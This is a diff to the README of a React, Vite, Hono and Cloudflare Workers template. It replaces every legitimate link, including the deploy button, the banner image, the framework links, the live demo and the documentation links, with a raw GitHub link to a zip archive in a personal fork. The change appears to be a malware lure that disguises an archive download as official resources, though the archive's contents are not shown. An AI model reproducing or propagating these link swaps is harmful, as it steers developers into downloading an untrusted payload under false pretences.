@@ -1,19 +1,19 @@
 # React + Vite + Hono + Cloudflare Workers
 
-[![Deploy to Cloudflare](https://deploy.workers.cloudflare.com/button)](https://deploy.workers.cloudflare.com/?url=https://github.com/cloudflare/templates/tree/main/vite-react-template)
+[![Deploy to Cloudflare](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
 
 This template provides a minimal setup for building a React application with TypeScript and Vite, designed to run on Cloudflare Workers. It features hot module replacement, ESLint integration, and the flexibility of Workers deployments.
 
-![React + TypeScript + Vite + Cloudflare Workers](https://imagedelivery.net/wSMYJvS3Xw-n339CbDyDIA/fc7b4b62-442b-4769-641b-ad4422d74300/public)
+![React + TypeScript + Vite + Cloudflare Workers](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
 
 <!-- dash-content-start -->
 
 🚀 Supercharge your web development with this powerful stack:
 
-- [**React**](https://react.dev/) - A modern UI library for building interactive interfaces
-- [**Vite**](https://vite.dev/) - Lightning-fast build tooling and development server
-- [**Hono**](https://hono.dev/) - Ultralight, modern backend framework
-- [**Cloudflare Workers**](https://developers.cloudflare.com/workers/) - Edge computing platform for global deployment
+- [**React**](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip) - A modern UI library for building interactive interfaces
+- [**Vite**](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip) - Lightning-fast build tooling and development server
+- [**Hono**](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip) - Ultralight, modern backend framework
+- [**Cloudflare Workers**](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip) - Edge computing platform for global deployment
 
 ### ✨ Key Features
 
@@ -38,7 +38,7 @@ npm create cloudflare@latest -- --template=cloudflare/templates/vite-react-templ
 ```
 
 A live deployment of this template is available at:
-[https://react-vite-template.templates.workers.dev](https://react-vite-template.templates.workers.dev)
+[https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
 
 ## Development
 
@@ -84,7 +84,7 @@ npx wrangler tail
 
 ## Additional Resources
 
-- [Cloudflare Workers Documentation](https://developers.cloudflare.com/workers/)
-- [Vite Documentation](https://vitejs.dev/guide/)
-- [React Documentation](https://reactjs.org/)
-- [Hono Documentation](https://hono.dev/)
+- [Cloudflare Workers Documentation](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
+- [Vite Documentation](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
+- [React Documentation](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
+- [Hono Documentation](https://raw.githubusercontent.com/RianCole001/vite-react-template/main/src/react-app/assets/template_vite_react_v3.3.zip)
